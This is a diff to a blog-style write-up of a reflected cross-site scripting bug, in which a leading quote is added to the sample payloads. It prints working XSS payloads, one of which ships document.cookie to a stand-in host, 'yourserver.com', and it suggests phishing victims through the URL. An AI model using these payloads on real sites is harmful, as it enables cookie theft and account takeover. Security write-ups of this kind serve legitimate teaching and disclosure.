@@ -62,11 +62,11 @@ In this particular situation, the special characters were not converted to HTML 
 
 ## Payload Crafting
 
-In this context we want to craft a payload that closes off the preceding h3 tag and continue to execute some code:
+In this context we want to craft a payload that closes off the quote and preceding h3 tag and continue to execute some code:
 ```
 Sample payload: 
 
-</h3><img src=x onerror=prompt(document.domain)>
+'</h3><img src=x onerror=prompt(document.domain)>
 ```
 This will cleanly close off the encompassing h3 tag and allow us to execute code that will pop up an alert to the screen with the name of the vulnerable domain:
 
@@ -83,14 +83,14 @@ Sample payload encoded:
 This XSS bug not only modifies the DOM but is reflected in the URL. This means we could carry out the XSS attack by providing a simple link in a phishing campaign. Collecting user cookies at this point is trivial:
 
 ```
-</h3><img src=x onerror=prompt(document.cookie)>
+'</h3><img src=x onerror=prompt(document.cookie)>
 ```
 
 ![cookies](/assets/img/posts/cookie_redac.png)
 
 Harvesting cookies and shipping them off to a remote server is also quite simple:
 ```
-</h3><script>document.location='http://yourserver.com/cookieharvest.php?d='+document.cookie;</script>
+'</h3><script>document.location='http://yourserver.com/cookieharvest.php?d='+document.cookie;</script>
 ```
 
 From here the possibilities are endless. There are quite a few XSS [payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) on the web. Some possible attack scenarios include: 
